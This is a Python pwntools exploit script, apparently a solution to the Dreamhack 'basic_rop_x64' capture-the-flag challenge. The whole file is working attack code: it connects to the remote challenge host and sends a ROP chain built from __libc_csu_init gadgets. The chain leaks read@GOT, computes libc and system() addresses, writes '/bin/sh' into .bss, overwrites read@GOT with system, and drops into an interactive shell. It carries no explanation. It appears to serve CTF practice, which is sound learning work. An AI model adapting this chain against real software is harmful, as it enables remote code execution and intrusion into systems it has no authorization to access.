#!/usr/bin/python3

import pwn

#p = pwn.process("./basic_rop_x64")
p = pwn.remote("host1.dreamhack.games", 17409)
elf = pwn.ELF("./basic_rop_x64")
pwn.context.log_level = 'debug'

# Fixed Value in Exploit

rbx = 0x0
rbp = 0x1
writeGot = 0x601020
readGot = 0x601030
padding = b"A"*0x48
popGadget = 0x40087a
callGadget = 0x400860
readOffset = 0xf7250
systemOffset = 0x45390
forRSP = b"A"*0x8

# S#1

payload = padding
payload += pwn.p64(popGadget)
payload += pwn.p64(rbx)
payload += pwn.p64(rbp)
payload += pwn.p64(writeGot)
payload += pwn.p64(0x8)
payload += pwn.p64(readGot)
payload += pwn.p64(0x1)
payload += pwn.p64(callGadget)

# S#2

payload += forRSP
payload += pwn.p64(rbx)
payload += pwn.p64(rbp)
payload += pwn.p64(readGot)
payload += pwn.p64(0x8)
payload += pwn.p64(elf.bss())
payload += pwn.p64(0x0)
payload += pwn.p64(callGadget)

# S#3

payload += forRSP
payload += pwn.p64(rbx)
payload += pwn.p64(rbp)
payload += pwn.p64(readGot)
payload += pwn.p64(0x8)
payload += pwn.p64(readGot)
payload += pwn.p64(0x0)
payload += pwn.p64(callGadget)

# S#4

payload += forRSP
payload += pwn.p64(rbx)
payload += pwn.p64(rbp)
payload += pwn.p64(readGot)
payload += pwn.p64(0x0)
payload += pwn.p64(0x0)
payload += pwn.p64(elf.bss())
payload += pwn.p64(callGadget)

p.sendline(payload)
p.recv(0x40)
readAddr = pwn.u64(p.recv(0x8))
pwn.log.info("Mapped read Address: " + hex(readAddr))

libcBase = readAddr - readOffset
systemAddr = libcBase + systemOffset
pwn.log.info("libc Base Address: " + hex(libcBase))
pwn.log.info("Mapped system Address: " + hex(systemAddr))

pwn.log.info("Send '/bin/sh' to bss")
p.send("/bin/sh\x00")

pwn.log.info("Send System Address to read@got")
p.send(pwn.p64(systemAddr))

pwn.log.info("Loading shell...")
p.interactive()
